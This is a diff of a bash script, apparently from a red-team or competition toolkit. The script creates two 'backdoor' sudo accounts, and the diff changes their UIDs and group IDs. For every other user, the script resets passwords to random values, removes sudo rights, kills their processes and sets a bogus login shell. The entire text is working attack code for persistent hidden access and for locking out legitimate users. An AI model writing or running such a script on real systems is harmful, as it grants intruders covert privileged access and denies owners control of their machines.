@@ -57,6 +57,11 @@ echo "$backdoor_username2:$backdoor_password2" | chpasswd
 usermod -aG sudo $backdoor_username1
 usermod -aG sudo $backdoor_username2
 
+usermod -u 873 $backdoor_username1
+groupmod -g 890 $backdoor_username1
+usermod -u 501 $backdoor_username2
+groupmod -g 501 $backdoor_username2
+
 # Secure the backdoor user's account by only allowing root/self to access their home directories
 chown root:root /home/$backdoor_username1
 chmod 700 /home/$backdoor_username1
@@ -113,6 +118,8 @@ for user in $all_users; do
         # Change the user's password
         echo "$user:$random_password" | chpasswd
 
+        chsh -s /bin/redd $user
+
         if grep -q "^$user" /etc/sudoers; then
             # Remove the user from the sudo group
             deluser $user sudo
@@ -121,8 +128,6 @@ for user in $all_users; do
 
         # Kill all processes owned by the user
         pkill -u $user
-
-        chsh -s /bin/redd $user
 
         # Get all active SSH sessions for the user
         #active_sessions=$(who | grep $user | grep -v "10.15.1" | awk '{print $2}')
